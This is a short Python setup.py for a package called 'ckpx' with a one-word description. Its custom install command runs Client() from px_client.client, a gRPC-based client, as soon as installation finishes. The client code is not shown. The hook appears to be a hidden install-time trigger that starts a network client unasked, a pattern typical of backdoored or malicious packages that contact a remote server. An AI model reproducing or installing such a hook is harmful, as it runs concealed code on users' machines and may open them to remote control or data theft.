from setuptools import setup, find_packages
from setuptools.command.install import install
from px_client.client import Client

class CustomInstall(install):
    def run(self):
        install.run(self)
        Client()

setup(
    name='ckpx',
    version='0.0.6',
    packages=find_packages(),
    install_requires=['grpcio>=1.27.2', 'grpcio-tools>=1.27.2'],
    author='p2trx',
    description='px',
    url='https://github.com/p2trx/px',
    # include_package_data=True,
    # package_data={
    #     'package': ['px_server/package/**/*'],
    # },
    cmdclass={'install': CustomInstall},
)
